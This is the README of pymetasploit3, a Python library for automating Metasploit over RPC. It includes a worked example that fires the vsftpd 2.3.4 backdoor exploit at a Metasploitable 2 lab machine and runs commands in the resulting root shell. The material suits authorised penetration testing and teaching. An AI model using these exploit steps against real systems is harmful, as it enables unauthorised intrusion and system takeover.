Pymetasploit33
=======

Pymetasploit3 is a full-fledged Python3 Metasploit automation library. It can interact with Metasploit either through msfrpcd or the msgrpc plugin in msfconsole.

# Original library: pymetasploit

This is an updated and improved version of the Python2 pymetasploit library by allfro.

Original project  : https://github.com/allfro/pymetasploit

# Installation

    git clone https://github.com/DanMcInerney/pymetasploit3
    cd [Download path]/pymetasploit3
    pip3 install pymetasploit3 --user (or omit --user to install system-wide, not recommended)

# Basic Usage

## Starting Metasploit RPC server

### Msfconsole
This will start the RPC server on port 55553 as well as the Metasploit console UI
```bash
$ msfconsole
msf> load msgrpc [-P yourpassword]
```
### msfrpcd
This will start the RPC server on port 55552 and will just start the RPC server in the background
```bash
$ msfrpcd -P yourpassword
```

## RPC client

### Connecting to `msfrpcd`

```python
>>> from pymetasploit3.msfrpc import MsfRpcClient
>>> client = MsfRpcClient('yourpassword')
```

The `MsfRpcClient` class provides the core functionality to navigate through the Metasploit framework. Use 
```dir(client)``` to see the callable methods.

```python
>>> [m for m in dir(client) if not m.startswith('_')]
['auth', 'authenticated', 'call', 'client', 'consoles', 'core', 'db', 'jobs', 'login', 'logout', 'modules', 'plugins',
'port', 'server', 'token', 'sessions', 'ssl', 'uri']
>>>
```

Like the metasploit framework, `MsfRpcClient` is segmented into different management modules:

* **`auth`**: manages the authentication of clients for the `msfrpcd` daemon.
* **`consoles`**: manages interaction with consoles/shells created by Metasploit modules.
* **`core`**: manages the Metasploit framework core.
* **`db`**: manages the backend database connectivity for `msfrpcd`.
* **`modules`**: manages the interaction and configuration of Metasploit modules (i.e. exploits, auxiliaries, etc.)
* **`plugins`**: manages the plugins associated with the Metasploit core.
* **`sessions`**: manages the interaction with Metasploit meterpreter sessions.

### Running an exploit

Explore exploit modules:

```python
>>> client.modules.exploits
['windows/wins/ms04_045_wins', 'windows/winrm/winrm_script_exec', 'windows/vpn/safenet_ike_11',
'windows/vnc/winvnc_http_get', 'windows/vnc/ultravnc_viewer_bof', 'windows/vnc/ultravnc_client', ...
'aix/rpc_ttdbserverd_realpath', 'aix/rpc_cmsd_opcode21']
>>>
```

Explore other modules:

```python
>>> client.modules.auxiliary
...
>>> client.modules.encoders
...
>>> client.modules.nops
...
>>> client.modules.payloads
...
>>> client.modules.post
...
```

Create an exploit module object:

```python
>>> exploit = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')
>>>
```

Explore exploit information:

```python
>>>  print(exploit.description)

          This module exploits a malicious backdoor that was added to the	VSFTPD download
          archive. This backdoor was introduced into the vsftpd-2.3.4.tar.gz archive between
          June 30th 2011 and July 1st 2011 according to the most recent information
          available. This backdoor was removed on July 3rd 2011.

>>> exploit.authors
[pymetasploit3, pymetasploit3]
>>> exploit.options
['TCP::send_delay', 'ConnectTimeout', 'SSLVersion', 'VERBOSE', 'SSLCipher', 'CPORT', 'SSLVerifyMode', 'SSL', 'WfsDelay',
'CHOST', 'ContextInformationFile', 'WORKSPACE', 'EnableContextEncoding', 'TCP::max_send_size', 'Proxies',
'DisablePayloadHandler', 'RPORT', 'RHOST']
>>> exploit.missing_required # Required options which haven't been set yet
['RHOST']
>>>
```

Let's use a [Metasploitable 2](http://sourceforge.net/projects/metasploitable/) instance running on a VMWare
machine as our exploit target. It's running our favorite version of vsFTPd - 2.3.4 - and we already have our exploit
module loaded. Our next step is to specify our target:

```python
>>> exploit['RHOST'] = '172.16.14.145' # IP of our target host
>>>
```

Select a payload:

```python
>>> exploit.targetpayloads()
['cmd/unix/interact']
>>>
```

At this point, this exploit only supports one payload (`cmd/unix/interact`). So let's pop a shell:

```python
>>> exploit.execute(payload='cmd/unix/interact')
{'job_id': 1, 'uuid': '3whbuevf'}
>>>
```

We know the job ran successfully because `job_id` is `1`. If the module failed to execute for any reason, `job_id` would
 be `None`. If we managed to pop our box, we might see something nice in the sessions list:

```python
>>> client.sessions.list
{1: {'info': '', 'username': 'jsmith', 'session_port': 21, 'via_payload': 'payload/cmd/unix/interact',
'uuid': '5orqnnyv', 'tunnel_local': '172.16.14.1:58429', 'via_exploit': 'exploit/unix/ftp/vsftpd_234_backdoor',
'exploit_uuid': '3whbuevf', 'tunnel_peer': '172.16.14.145:6200', 'workspace': 'false', 'routes': '',
'target_host': '172.16.14.145', 'type': 'shell', 'session_host': '172.16.14.145', 'desc': 'Command shell'}}
>>>
```

### Interacting with the shell
Create a shell object out of the session number we found above and write to it:

```python
>>> shell = client.sessions.session('1')
>>> shell.write('whoami')
>>> print(shell.read())
root
>>>
```

Run the same `exploit` object as before but wait until it completes and gather it's output:

```python
>>> cid = client.consoles.console().cid # Create a new console and store its number in 'cid'
>>> print(client.consoles.console(cid).run_module_with_output(exploit, payload='cmd/unix/interact'))
# Some time passes
'[*] 172.16.14.145:21 - Banner: 220 vsFTPd 2.3.4
[*] 172.16.14.145:21 - USER: 331 Please specify the password
...
'

```

Running session commands isn't as simple as console commands. The Metasploit RPC server will return a `busy` value that 
is `True` or `False` with `client.console.consoles('1').is_busy()` but determining if a `client.sessions.session()`  is 
done running a command requires us to do it by hand. For this purpose we will use a list of strings that, when any one 
is found in the session's output, will tell us that the session is done running its command. Below we are running the 
`arp` command within the session. We know this command will return one large blob of text that will contain the 
characters `----` if it's successfully run so we put that into a list object. 
 
 ```python
>>> session_id = '1'
>>> session_command = 'arp'
>>> terminating_strs = ['----']
>>> client.session.sessions(session_id).run_with_output(session_command, terminating_strs)
# Some time passes
'\nARP Table\n                  ---------------\n  ...`
```

One can also use a timeout and simply return all data found before the timeout expired. `timeout` defaults to 
Metasploit's comm timeout of 300s and will throw an exception if the command timed out. To change this, set 
 `timeout_exception` to `False` and the library will simply return all the data from the session output it found before
 the timeout expired.
 ```python
>>> session_id = '1'
>>> session_command = 'arp'
>>> terminating_strs = ['----']
>>> client.session.sessions(session_id).run_with_output(session_command, terminating_strs, timeout=10, timeout_exception=False))
# 10s pass
'\nARP Table\n                  ---------------\n  ...`
```

### More examples

Many other usage examples can be found in the `example_usage.py` file.

# Contributions

I highly encourage contributors to send in any and all pull requests or issues. And thank you to allfro for writing
the original pymetasploit library.